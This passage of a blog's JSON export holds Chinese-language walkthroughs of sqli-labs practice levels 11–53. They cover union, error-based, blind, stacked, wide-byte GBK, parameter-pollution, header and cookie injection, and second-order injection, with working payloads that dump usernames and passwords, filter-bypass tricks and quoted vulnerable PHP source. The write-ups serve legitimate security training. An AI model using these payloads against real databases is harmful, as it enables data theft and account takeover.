table_name=’users’ and table_schema=’security’)),1) 爆值：?sort=1 and updatexml(1,concat(‘~’,(select * from (select concat_ws(‘ ‘,id,username,password) from users limit 0,1) x)),1) 注：这边不知道为什么&#39;#&#39;不能用了，找了半天原因。 解法二.布尔盲注：SQL 像 PHP，也是一种弱类型，它会认为true=1，false=0。用在order by后会直接导致显示不同： A: B: C: 通过对比A,C我们可以发现，order by后接返回数字或布尔值（因为是弱类型，布尔值返回仍是数字）的语句是没有作用的！也就是说我们无法使用句式一、二进行布尔盲注，那么我们能不能使用句式三进行布尔盲注呢？ 我们先输入：?sort=rand(true) 再输入：?sort=rand(false) 我们可以看到两种得到的返回不同，那么就说明我们可以利用句式三来进行布尔盲注。 Q:其实这边有一个疑问，不是说order by后接的数字不起作用吗，为什么rand函数的返回值也是数字，但是却可以起作用呢？我突然有个猜想——order by后接字符、字符串或布尔值是不起作用的，也就是说数据库返回值不会根据字符串的不同而不同，如果是这样就可以理解为什么了,可是在我用时间盲注解这关的时候if函数返回值是1但是页面返回却和?sort=1的不同。我蒙了，算了，挖个坑吧！！！！！！！！！！！！！！！！！ 我们的布尔盲注思路是这样的：?sort=rand（sql语句），如果sql语句正确，那么页面的返回会和?sort=rand(true)一样（利用了rand函数的伪随机性），反之和?sort=rand(false)一样。 sp：rand()函数是个随机函数，返回0~1间的小数。使用时也可以给定参数值（随机种子），相同的参数生成的结果也相同（伪随机性）。 爆库：?sort=rand(left(database(),8)=’security’) 我们看到页面返回与?sort=rand(true)的一样，说明数据库名就是security。 后续的爆表，爆列等也是这样，构造payload然后比对页面返回得结果。不多赘述。 解法三.时间盲注：时间注入可以利用句式一或者句式二。在这里我们就简单的拿爆库举个例子，剩下的参考时间盲注那一关的笔记。 爆库：?sort=if(mid(database(),1,8)=’security’,1,sleep(5)) lesson47：和lesson46一样，注意注入类型的变化做出适当改变（包括句式的改变还有添加注释符等）即可。 lesson48：同lesson46，但是页面不再出现报错回显，故报错注入不可用。 lesson49：同lesson47，但是页面不再出现报错回显，故报错注入不可用。 lesson50、51、52 、53：就是之前学的堆叠注入加上新学的order by后的注入，没什么新颖的，打组合拳就好了。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson38-45","date":"2021-02-06T14:44:20.000Z","path":"2021/02/06/lesson38-45/","text":"background——堆叠注入：在 SQL 中，;(分号)是用来表示一条 sql 语句的结束。试想一下我们在 ; 结束一个 sql 语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。但对于不同数据库（mysql，sqlserver，oracle等）来说，除oracle不允许外，其他数据库我们可以在一条sql语句后紧接着构造下一条sql语句。 这里可能会有一个问题——union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？(1)区别就在于 union 或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是 任意的语句。 (2)堆叠注入不会像联合注入那样受第一句sql语句影响。我们知道联合注入要满足第一句sql语句错误的条件下才会执行后面我们构造的sql语句，而堆叠注入没有这个问题。 (3)在我们的 web 系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第 二个语句产生错误或者结果时只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，我们建议使用 union（联合）注入。例以lesson38的一个payload为例：?id=0’ union select 1,2,database();create table test like users–+这样我们可以前台获取数据信息，后台篡改数据信息，实现“双管齐下”。 sp：关于数据库的一些增删改查在另一篇博客已经专门介绍了，这里不多赘述。 lesson38：认识一下新函数： mysqli_connect()函数：功能：打开一个到 MySQL 服务器的新的连接。语法：mysqli_connect(host,username,password,dbname,port,socket)； mysqli_select_db()函数：作用：用于更改连接的默认数据库。语法：mysqli_select_db(connection,dbname) mysqli_multi_query()函数：语法：mysqli_multi_query(connection,query)； 功能：执行一个或多个针对数据库的查询。多个查询用分号进行分隔。 注：这个函数是可实现堆叠注入的重要因素！ mysql_store_result()函数：功能：用于将mysqli_query()查询的结果集存储到变量中 mysqli_more_results()函数：语法：mysqli_more_results(connection);参数：connection——必需。规定要使用的mysql连接功能：检查一个多查询是否有更多的结果。 mysqli_fetch_row() 函数： 语法：mysqli_fetch_row(result)； 参数：result——必须。规定由 mysqli_query()、mysqli_store_result() 或 mysqli_use_result() 返回的结果 集标识符。 功能：从结果集中取得一行，并作为枚举数组返回。 lesson39&amp;40&amp;41：就改变了id闭合方式，注意注入类型变化即可，其余与lesson38一致。 lesson42：这关可以用二阶注入，但是没必要，因为我们输入的密码没有被过滤，我们可以用报错注入，延时注入。或者用我们新学的堆叠注入。 在我们使用堆叠注入时虽然页面返回错误，但是我们在数据库中查找，还是可以看到我们的payload执行l。 lesson43&amp;44&amp;45：就改变了id闭合方式，注意注入类型变化即可，其余与lesson42一致。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson32-37","date":"2021-02-06T05:17:38.000Z","path":"2021/02/06/lesson32-37/","text":"background——宽字节注入： 原理：mysql在使用GBK编码的时候，会认为两个字符（前一个字符的ascii码必须大于128才能到汉字的范围）。）为一个汉字，例如%aa%5c就是一个汉字。 以lesson32为例，查看源码发现PHP会对\\（反斜杠）,&#39;（单引号）,&quot;（双引号）做转义处理 12345678910111213141516171819202122232425262728function check_addslashes($string)&#123; $string = preg_replace(&#x27;/&#x27;. preg_quote(&#x27;\\\\&#x27;) .&#x27;/&#x27;, &quot;\\\\\\\\\\\\&quot;, $string); //escape any backslash $string = preg_replace(&#x27;/\\&#x27;/i&#x27;, &#x27;\\\\\\&#x27;&#x27;, $string); //escape single quote with a backslash $string = preg_replace(&#x27;/\\&quot;/&#x27;, &quot;\\\\\\&quot;&quot;, $string); //escape double quote with a backslash return $string;&#125;// take the variables if(isset($_GET[&#x27;id&#x27;]))&#123;$id=check_addslashes($_GET[&#x27;id&#x27;]);//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;//logging the connection parameters to a file for analysis.$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\\n&quot;);fclose($fp);// connectivity mysql_query(&quot;SET NAMES gbk&quot;);$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;$result=mysql_query($sql);//!对于源码的解读：我认为24-26行的命令目的是将sql语句用gbk编码，以防带入数据库后乱码。$row = mysql_fetch_array($result); 那么我们利用它会将sql语句转为gbk编码，通过吞并\\（url编码%5c）的方式绕开其对单引号的转义。例如：%aa%5c，这在gbk编译后成为一个汉字。（gbk编码表https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php）比如 乗 字符，GBK编码 %81%5C 补充：有些符号（# $ ^ &amp; * + =）在URL中是不能直接传递的，如果要在URL中传递这些特殊符号，那么就要使用他们的编码了。编码的格式为：%加字符的ASCII码，即一个百分号%，后面跟对应字符的ASCII（16进制）码值。（URL编码就是在uft-8编码的基础上，给编码的每个字节加上百分号。） lesson32：爆库：payload： 1?id&#x3D;%aa&#39; union select 1,2,database()--+ 爆表：payload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;0x7365637572697479--+ 注：爆表本应该是?id=%aa’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+ 但是因为PHP对&#39;转义，那么我们可以用十六进制来表示security 爆列：payload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;0x7365637572697479--+ 爆值：payload: 1?id&#x3D;%aa&#39; union select 1,2,group_concat(username,0x2c,password) from users--+ lesson33：和lesson32一模一样。 lesson34：这关我还以为会和之前两关一样，只不过改为post类型，结果发现了一些不同。 当我在username输入admin%aa’ union select 1,database()#，登入失败，按理来说不应该呀。于是我用burpsuite抓包： 我们明明输入的uname=admin%aa’ union select 1,database()#，可是我们看到多了一个25在%aa中间，这是什么情况呢？原来，get与post提交数据类型不同，get型如果输入符合url的格式那么就直接以url形式提交，也就是说遇到%aa这种直接当做url编码处理，而post型却不是这样，他会把你提交的%aa当做正常数据，然后进行url编码，于是就变成了%25aa。 那么我们要怎么避免这个问题呢? 我们可以用burp抓包，手动去掉25 补充：不同类型编码 UTF-16编码：一个英文字母字符或一个汉字字符存储都需要2个字节（Unicode扩展区的一些汉字存储需要4个字节）。UTF-8编码：一个英文字符等于一个字节，一个中文（含繁体）等于三个字节。中文标点占三个字节，英文标点占一个字节Unicode编码：一个英文等于两个字节，一个中文（含繁体）等于两个字节。中文标点占两个字节，英文标点占两个字节。 —）我们还可以用另外一种方式：?id=牛’ or 1=1# 在经过url编码后，牛被编码成三个字节加上单引号一个字节，再加上单引号被转义后反斜杠一个字节，总共五个字节，我们已经知道gbk编码时两个字节为一汉字，那么这样转义单引号用的反斜杠被合并，单引号“逃逸”成功。 https://www.qqxiuzi.cn/bianma/Unicode-UTF.php在线Unicode和UTF编码转换网址 lesson35：没营养 lesson36：和lesson32一样，只不过把过滤函数改成mysql_real_escape_string（）。 lesson37：和lesson34一样，只不过把过滤函数改成mysql_real_escape_string（）。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson29-31","date":"2021-02-05T08:14:01.000Z","path":"2021/02/05/lesson29-31/","text":"background：首先，我们先来了解一下什么是web应用的基本架构： lesson29这关中，服务端web应用有两个，一个是以tomcat为引擎的jsp型服务器，一个是以apache为引擎的php型服务器： 打开indexjsp查看源码： 方框内执行的是判断tomcat获取的id是否为纯数字。 接着，如果id是纯数字，它“确认安全”，就会把输入传递给apache服务器。 这过程中tomcat的作用就相当于一道waf（防火墙）。那么我们怎么绕过这个防火墙呢？ 悉知，大多数服务器对参数的解析： 也就是说，当遇到多个参数时，tomcat只会获取第一个参数，对其进行上述处理，只要第一个参数复合它的要求，tomcat就会把我们的输入传递到下一级。因此我们可以利用这一特点，构造多个参数来达到目的。 lesson29：爆库：payload： 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,database()--+ 爆表：payload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+ 爆列：payload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39;--+ 爆值：payload: 1http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;tomcat-files&#x2F;sqli-labs&#x2F;Less-29&#x2F;?id&#x3D;1&amp;id&#x3D;0&#39;union select 1,2,group_concat(username,0x3a,password) from users--+ lesson30：注入类型：&quot; ，其余一样。 lesson31：注入类型：&quot;) ，其余一样。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson25-28a","date":"2021-02-04T08:26:27.000Z","path":"2021/02/04/lesson25-28a/","text":"lesson25：这一关它告诉我们and和or都被过滤了。 一般，绕开过滤的方法有以下几种： （1）大小写变形 Or,OR,oR （2）编码，hex，urlencode （3）添加注释/or/ （4）利用符号 and=&amp;&amp;，or=|| （5）构造字符串——oorr，anandd 我们查看源码： 这里的or和and采用了i正则匹配，大小写都无法绕过。 { 拓展一下PHP正则表达式的模式修饰符 i ​ 如果设定此修正符，模式中的字符将同时匹配大小写字母。 m当设定了此修正符，“行起始”和“行结束”除了匹配整个字符串开头和结束外，还分别匹配其中的换行符的之后和之前。 s如果设定了此修正符，模式中的圆点元字符（.）匹配所有的字符，包括换行符。没有此设定的话，则不包括换行符。 x如果设定了此修正符，模式中的空白字符除了被转义的或在字符类中的以外完全被忽略，在未转义的字符类之外的 #以及下一个换行符之间的所有字符，包括两头，也都被忽略。 } 那么这关我们就以双写绕过的方式为例。 查看源码： 1$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;; 从中得知这关为单引号类型注入。 当输入?id=1时，页面有回显。那么我们可以采用union联合注入。 爆库:输入：?id=0’ union select 1,2,database()–+ 得， 爆表：输入：?id=0’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’–+ 得， 注：information中也含有or，因此也需要做绕过处理。 爆列：输入：?id=0’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=’security’–+ 得， 爆值：输入：?id=0’ union select 1,2,group_concat(username,0x3a,passwoorrd) from users–+ 得， 注：password中也含有or，因此也需要做绕过处理。 lesson25a:和lesson25没什么区别，注意注入类型就好了。 lesson26：查看源码： 我们可以看到它就过滤了一堆字符。此时，我们可以采用URL编码绕过这些过滤： + URL 中+号表示空格 %2B空格 URL中的空格可以用+号或者编码 %20/ 分隔目录和子目录 %2F? 分隔实际的URL和参数 %3F% 指定特殊字符 %25# 表示书签 %23&amp; URL 中指定的参数间的分隔符 %26= URL 中指定参数的值 %3D 我不知道为什么空格我一直找不到绕开的方法，上面的几种都不行，好像是apache的问题，要我们用linux系统才能绕过。既然这样我们只能避免输入空格了，使用报错注入—— 爆库：输入：?id=1’||updatexml(1,concat(‘~’,database()),1)||’1’=’1 得， 爆表：输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1 得， 爆列：输入：?id=1’||updatexml(1,concat(‘~’,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’anandd(table_schema=’security’)))),1)||’1’=’1 得， 爆值：输入：?id=1’||updatexml(1, concat(0x7e,(select(group_concat(concat_ws(0x7e,username,passwoorrd)))from(security.users))) ,1)||’1’=’1 得， 这里有一个问题，limit因为过滤因素用不了，很难受，而且报错长度又有限，那么这时我们可以通过控制id的值来一个个查询，例如输入：?id=1’ || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd) )) from (security.users) where(id=5))) ,1) || ‘1’=’1 lesson26a：当我们输入导致sql语法错误的时候，不会回显，那么我们就无法使用报错注入了。 lesson27：同lesson26，报错注入。 源码： 若想使用union联合注入，只需要将 union 和 select 改为大小写混合就可以了。 这关取消了对and和or的过滤。 lesson27a：不能使用报错注入。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson24","date":"2021-02-03T13:07:57.000Z","path":"2021/02/03/lesson24/","text":"lesson24：这关感觉很有意思。以往的SQL注入都是一阶注入，而这一关出现了二阶注入。先介绍一下二阶注入： 二阶注入也叫存储型的注入，就是将可能导致 sql 注入的字符先存入到数据库中，当再次调用这个恶意构造的字符时，就会触发sql 注入。 我们先在页面上做一些试探。 点击：Forgot your password？ 页面跳转： 大意是如果你忘了你的密码，就自己黑了他。那么我们肯定不能在这里下手了。 点击：New User click here? 页面跳转： 我们看到这就是一个普通的注册界面，有什么用呢，我们先暂不言表。 我们接着试探，输入正确账号密码，进入到一个修改密码的网页： 不知道哪个地方可以注入，我们先打开login的源码： 发现登入页面输入的账号密码都被转义了，那么肯定不能直接注入，接着看代码： 1$_SESSION[&quot;username&quot;] = $login; 发现它设了一个新变量储存从数据库中选择出来的username的值。 打开pass_change的源码： 我们可以看出从改密码的页面注入是不可行的了，但是我们发现从数据库中选择出来的username没有被复查，直接构造成sql语句，带入到数据库中。于是我们就可以有这样一种思路，我们先注册一个账号，例如：账户：admin’#（admin为目标用户名），密码：123。 然后我们输入我们注册的这个账号密码登入，进入修改密码页面， pass_change的源码中sql语句是： 1$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; 而登入我们注册的账户后，sql语句被篡改为： 123$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;相当于：$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;&quot;; 也就是说，我们达到了无需知道目标账户密码而可以修改目标账户的密码，进而通过修改的新密码登入目标账户。 但是这里有个问题：我们输入的单引号不是被转义了吗，那它构造的sql语句怎么还会起作用呢？ 原来转义只是暂时的，数据存储到数据库以后还是以原句的形式存在，反斜杠不会随之插入数据库。 注：我发现这样注入还是很有局限性的，因为你只能一个一个去破解，如果通过注册账户时构造payload，会受到字节长度的限制。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson23","date":"2021-02-03T10:52:07.000Z","path":"2021/02/03/lesson23/","text":"lesson23：这关又变回了get请求类型。 在url行输入：?id=1, 发现有回显。 输入：?id=1’，报sql语法错误； 输入：?id=1’ or ‘1’=’1 ，登入成功； 输入：?id=1’ and ‘1’=’2 ，登入失败。因此确定为单引号类型注入。 因为有回显，那么接下来使用联合注入就可以了，详情参考lesson1，不再赘述。 但是有一个点值得注意，就是我在构造payload语句时，我发现我若以 &#39;--+&#39; 或者 # 结尾则页面返回sql语法错误，于是我查看源码： 12345$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); 介绍一下preg_replace()函数： 因此我们得知 &#39;--+&#39; 和 # 都被屏蔽掉了，那么我们要怎么闭合sql语句呢？ 1.union注入时以爆库为例：?id=-1’ union select 1,database(),’3 ​ 或：?id=-1’ union select 1,database(),3 or ‘1’=’ 2.报错注入时以爆库为例：?id=-1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) or ‘1’=’ ​","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson21-22","date":"2021-02-03T03:45:46.000Z","path":"2021/02/03/lesson21-22/","text":"这关虽然和lesson18很像，但是还是有很多东西值得开一篇新的blog。 lesson21：首先输入正确的用户名，密码，用burp抓包： 我们看到cookie一行的uname=被加密了，我们查看源码： 1setcookie(&#x27;uname&#x27;, base64_encode($row1[&#x27;username&#x27;]), time()+3600); sp：介绍一下setcookie（）函数： setcookie() 函数向客户端发送一个 HTTP cookie。 cookie 是由服务器发送到浏览器的变量。cookie 通常是服务器嵌入到用户计算机中的小文本文件。每当同一台计算机通过浏览器请求页面时，就会发送这个 cookie。 cookie 的名称自动指定为相同名称的变量。例如，如果被发送的 cookie 名为 “user”，则会自动创建一个名为 $user 的变量，包含 cookie 的值。 必须在任何其他输出发送到客户端前对 cookie 进行赋值。 如果成功，该函数返回 TRUE。如果失败则返回 FALSE。 因此我们可以看到cookie的值被加密了。接着看源码： 至此，我们可以确信还是从cookie进行注入，不过要将payload进行base64加密。 在线编译网站：https://tool.oschina.net/encrypt?type=3 那么开始注入吧！ 法1：报错注入，类似于lesson18，不过多赘述了，构造payload然后在网站上加密，再添加到cookie上。 法2：union联合注入，因为当我们输入正确的账号密码的时候，我们可以看到页面有回显。因此我们可以通过order by函数来查字节。剩下的就是以前学的内容了，不再赘述。 lesson22：这一关和lesson21差不多，就是注入类型变成了双引号，其余一致。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"HTTP协议","date":"2021-02-02T14:56:16.000Z","path":"2021/02/02/HTTP协议/","text":"","tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://example.com/tags/HTTP/"}]},{"title":"lesson18-20","date":"2021-02-01T12:33:49.000Z","path":"2021/02/01/lesson18-20/","text":"lesson18：这一题看过去和lesson17没什么差别，就多了一行id地址，我们查看源码： 12$uname = check_input($_POST[&#x27;uname&#x27;]);$passwd = check_input($_POST[&#x27;passwd&#x27;]); 可知，数据库对输入的username和password都做了过滤，所以我们想通过页面输入获取数据库信息的方法肯定是走不通了。我们再看源码： 12$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;]; 源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分: User-Agent 。而获取IP则使用了RENOTE_ADDR，这能直接获取TCP协议数据包的底层会话IP地址，它能被代理服务器或路由修改伪造，但修改XFF头就可以更改的。我们继续往下看： 1$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;; 从这里我们可以看到我们的uagent等会被带入到数据库中，那么我们好像可以通过对uagent进行改写，构造payload。 然后我们现在在页面输入正确账号密码后，发现页面回显： 那么我们更可以确定是对User-Agent 下手。 通过第三段源码我们可以得知注入类型为：’ ; 于是我们可以开始用burp suite抓包： payload模板：’ or updatexml(1,concat(‘#’,(clause),’#’),1),1,1)#其中clase为想要查询的子句；源码的insert语句中原本有三个参数（用三个1表示）——（1，1*，1**），然后1被&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) 替换，后面1*和1**是为了和insert语句中参数数量一致，否则会报错： 当updatexml函数报错以后，数据库就不会去检查1*和1**了。 注：&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1) 带入到源码中 &#39;&#39; or updatexml(1,concat(&#39;#&#39;,(clause),&#39;#&#39;),1)，第一处合并是空，所以uagent把updatexml函数的值带入数据库。 爆库：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select database()),&#x27;#&#x27;),1),1,1)# Forword，得： 爆表：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)# Forword，得： 注：因为我之前在security数据库里创了表，现在导致表太多了，而报错的长度有限，不能查到所有表。然后我想用limit函数限制查询数量，但是我尝试了好久没有成功，先留个坑吧！！！！！！！！！！！！！！！！！！ 爆列：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 1&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),&#x27;#&#x27;),1),1,1)# Forword，得： 爆值：网页输入正确账号密码，burp抓包，在User-Agent一行构造payload： 12&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27; &#x27;,id,username,password) from users limit 0,1) x),&#x27;#&#x27;),1),1,1)# Forword，得： lesson19：这一关和lesson18差不多，只不过改在Referer处写payload。 lesson20：这一关和lesson18也是类似，不过在cookie处写payload，而且因为当输入正确账号密码的时候，网页会回显，所以也可以采用union联合注入。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson17","date":"2021-01-31T13:26:30.000Z","path":"2021/01/31/lesson17/","text":"lesson17：这一关不管我们在username上构造什么payload都无法篡改数据库。 我们查看源码： 1234567891011121314151617181920212223242526function check_input($value) &#123; if(!empty($value)) &#123; // truncation (see comments) $value = substr($value,0,15); &#125; // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) &#123; $value = stripslashes($value); &#125; // Quote if not a number if (!ctype_digit($value)) &#123; $value = &quot;&#x27;&quot; . mysql_real_escape_string($value) . &quot;&#x27;&quot;; &#125; else &#123; $value = intval($value); &#125; return $value; &#125; 先认识一下陌生函数：1.get_magic_quotes_gpc()函数get_magic_quotes_gpc()函数取得PHP环境配置的变量magic_quotes_gpc(GPC, Get/Post/Cookie)值。返回0表示本功能关闭，返回1表示本功能打开。 注：开启magic_quotes_gpc=on之后，能实现addsIshes()和stripslashes()这两个函数的功能。在PHP4.0及以上的版本中，该选项默认情况下是开启的，所以在PHP4.0及以上的版本中，就算PHP程序中的参数没有进行过滤，PHP系统也会对每一个通过GET、POST、COOKIE方式传递的变量自动转换，换句话说，输入的注入攻击代码将会全部被转换，将给攻击者带来非常大的困难。 2.addslashes()函数addslashes()函数将输入数据中的预定义字符（单引号、双引号、反斜杠和NULL(空字符)）之前添加反斜杠\\的字符串。 3.stripslashes()函数stripslashes(string)函数删除由addslashes()函数添加的反斜杠。 注意：当magic_quotes_gpc打开时，所有的单引号、双引号、反斜杠和NULL(空字符)会自动转为含有反斜杠的溢出字符（PHP对所有的GET、POST和COOKIE数据自动运行addslashes()）。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。 4.ctype_digit()函数ctype_digit()函数检查字符串中每个字符是否都是十进制数字，若是则返回TRUE，否则返回FALSE。 5.mysql_real_escape_string()函数转义 SQL 语句中使用的字符串中的特殊字符： sp：怎么理解这个转义呢？举个例子，PHP把输入数据中的单引号转义了（单引号前加了个反斜杠）变成字符串一部分，那么输入数据代入数据库sql语句时，这个转义后的单引号就无法作为字符与数据库sql语句中本来存在的单引号合并，所以无法篡改sql语句。 我们观察源码： 1234567$uname=check_input($_POST[&#x27;uname&#x27;]); $passwd=$_POST[&#x27;passwd&#x27;];......$update=&quot;UPDATE users SET password = &#x27;$passwd&#x27; WHERE username=&#x27;$row1&#x27;&quot;; 由于数据库中对输入的username一顿操作，那么从username下手肯定吃不了兜着走，所以转变思路可以从password下手。 输入username=root ；password=root’，页面报sql语法错误，确定注入点为：’ ; ！这里介绍一个注入方法： 报错注入：A.常用函数：1.updatexml()函数：updatexml(xml_doc,xpath,new_value)函数有三个参数，分别是(xml_document, XPath_string, new_value)—- 第一个参数：xml_document， String格式，为XML文档对象的名称； 第二个参数：XPath_string (Xpath格式的字符串)； 第三个参数：new_value， String格式，替换查找到的符合条件的数据； 该函数的作用就是把xml文档中的指定字符串替换成新值。 2.extractvalue()函数：extractvalue(xml_doc, xpath)函数作用是从指定xml文档中查询指定的字符串。 B.报错注入原理：(1)参数xpath需要的是xpath格式的字符串，不是就会报错。 (2))当xpath路径语法错误时，就会报错。 注：报错的长度是有一定限制的，不要构造过长的payload，否则后面的字符串会被截断。 懂得了以上知识就可以开始注入了。因为两种函数的注入方法大相径庭，所以下面我就举updatexml为例解题。 爆库：输入： 12username=rootpassword=(anything)&#x27; or updatexml(1,concat(&#x27;#&#x27;, database()),1)# 得： 注：#字符是为了使xpath路径语法错误，也可以用别的字符代替。 爆表：输入： 12username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1)# 得： 爆列：输入： 12username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1)# 得： 爆值：输入： 123username=rootpassword=&#x27; or updatexml(1,concat(&#x27;#&#x27;,(select * from (select concat_ws(&#x27; &#x27;,id,username,password) from users limit 0,1) x)),1)# 得： 注：1.爆值的时候需要注意，不能直接用简单的select concat(username)，这样会引起报错： 原因是：在同一个语句中，不能先查询表中的值再update这个表，可以先把查询出的值作为一个派生表，然后在这个派生表里面再次进行查询。 2.由于用户数据较多，且报错内容有长度限制，所以我们在注入是可以通过改变limit函数变量来控制 回显内容。 sp：回顾一下字符串连接函数 1.concat(str1,str2,…)——没有分隔符地连接字符串2.concat_ws(‘separator’,str1,str2,…)——含有分隔符地连接字符串3.group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson11-16","date":"2021-01-30T14:56:26.000Z","path":"2021/01/30/lesson11-16/","text":"post注入Q：什么是post A：用户将数据从网页或者客户端提交 到服务器端，例如我们在登录过程中，输入用户名和密码，用户名和密码以表单的形式提交， 提交到服务器后服务器再在数据库中进行验证。 Q：与get注入的区别 A：get请求不发送数据至服务器，而post请求包含数据提交 post类型sql注入原理：将用户的输入当作代码/指令，在数据库中操作、执行。 lesson11：lesson11的源码： 1@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;; 通过查看lesson11的源码我们可以通过更改输入的内容进而修改数据库中代码， 如username=root‘ or ’1’=‘1，password=随意；发现登入成功。（username带入数据库为：@$sql=”SELECT username, password FROM users WHERE username=’$root‘ or ’1’=‘1’ and password=’$随意’ LIMIT 0,1”;我们可以看到只要数据库中存在用户root，那么这个语句恒成立） 那么我们可以进一步通过更改上传数据来达到获取数据库信息的目的。 一.爆库输入： 11&#x27; union select 1,database()# 得： 二.爆表输入： 11&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# 得： 三.爆列11&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; # 得： 四.爆值输入： 11&#x27; union select (select group_concat(username) from users), (select group_concat(password) from users)# 得： lesson12：lesson12的源码： 123 $uname=&#x27;&quot;&#x27;.$uname.&#x27;&quot;&#x27;;$passwd=&#x27;&quot;&#x27;.$passwd.&#x27;&quot;&#x27;; @$sql=&quot;SELECT username, password FROM users WHERE username=($uname) and password= ($passwd) LIMIT 0,1&quot;; 查看源代码不是很能直观看出数据库如何闭合函数，我们通过网页检测其是如何闭合参数的： username=a’a”a’)a 得： 我们通过观察password部分可知注入点为‘’）； 但是当我构造payload：root‘’）#时我发现页面返回错误，而且我发现这关无法通过注释达到篡改数据库。 